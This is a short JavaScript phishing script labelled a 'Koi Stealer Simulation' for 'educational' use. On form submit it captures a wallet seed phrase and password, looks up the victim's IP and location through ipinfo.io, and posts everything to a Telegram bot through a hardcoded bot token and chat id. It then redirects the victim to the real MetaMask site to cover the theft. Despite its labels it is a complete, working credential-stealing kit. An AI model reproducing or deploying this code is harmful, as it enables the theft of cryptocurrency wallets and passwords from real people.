const botToken = '7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q';
const chatId = '6697993658';

document.getElementById('phish-form').addEventListener('submit', function (e) {
  e.preventDefault();

  const seed = document.getElementById('wallet').value;
  const pass = document.getElementById('password').value;

  fetch('https://ipinfo.io/json?token=97788c7d33c9af') // You can also use freegeoip.app/json/
    .then(res => res.json())
    .then(data => {
      const message = `
🚨 [Koi Stealer Simulation]

🕒 Time: ${new Date().toLocaleString()}
🌐 IP: ${data.ip}
📍 Location: ${data.city}, ${data.region}, ${data.country}
🧭 ISP: ${data.org}
📱 User-Agent: ${navigator.userAgent}

🔑 Seed: ${seed}
🔐 Password: ${pass}
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      });

      alert("✅ Simulation complete. Data sent to Telegram (educational only).");
      window.location.href = "https://metamask.io"; // redirect to real site
    });
});
